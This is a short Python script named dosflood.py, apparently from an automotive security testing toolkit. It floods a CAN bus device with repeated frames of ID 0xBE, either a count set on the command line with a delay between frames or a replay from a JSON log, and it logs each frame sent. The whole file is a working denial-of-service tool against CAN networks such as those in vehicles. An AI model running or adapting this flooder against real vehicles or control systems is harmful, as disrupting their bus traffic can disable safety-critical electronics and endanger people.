import os
import sys
sys.path.append("..")
from CanLib.CAN_Driver import *
from CanLib.vtlog import *
from CanLib.CAN_Packet import *
import time

#This function is to Generate flooding can frames. 
#Example: 
# sudo python dosflood.py /dev/ttyACM0 50 0.01
# sudo python dosflood.py /dev/ttyACM0 dosflood.json
# payloads: 50(sending can frame counts); 0.01(time delay 0.01s between frames),dosflood.json(sending can frame file)
#Author: BensonYang
#Date: 26072016


def start(self,dev,filename = None,doscount = 1000, delay=0.1):  #no need this function, we can put sys argv as input doscount = 1000, time = 0, delay=0.1
	
	

	if filename:
		FILEPATH = os.getcwd()
		filename = FILEPATH + '/logfolder/'+ filename
		dev.sendframesfromfile(dev,filename)
	else:
		VTlogfile = VTlog()
		frbuffer = []

		data = [0 for x in range(8)]
		fr = CAN_Packet()
		fr.configure(0xBE,8,data)
		for i in range(0,doscount):
			dev.send_driver(fr)
			print fr
			time.sleep(delay)
			vtmsg = VTMessage(0xBE,8,data,1,delay,"S")				
			frbuffer.append(vtmsg)
		VTlogfile.writelog(frbuffer)


if __name__ == "__main__":
	
	print "Usage: sudo python dosflood.py candev [filename] [canframe count] [time delay]"	

	if (len(sys.argv) < 2):
		print 'You must specify one can device'
		exit(1)
	else:
		name_devices = sys.argv[1]

	dev = CANDriver(sys.argv[1],125000)
	dev.operate(Operate.START)

	if(sys.argv[2][-4:] == "json"):	# send frames from log file  
		start(None,dev,sys.argv[2])
	else:

		start(None,dev,None,int(sys.argv[2]),float(sys.argv[3]))
		#dev.sendframesfromfile(dev,'dosflood.json')
	
	
	
	
	
	


	
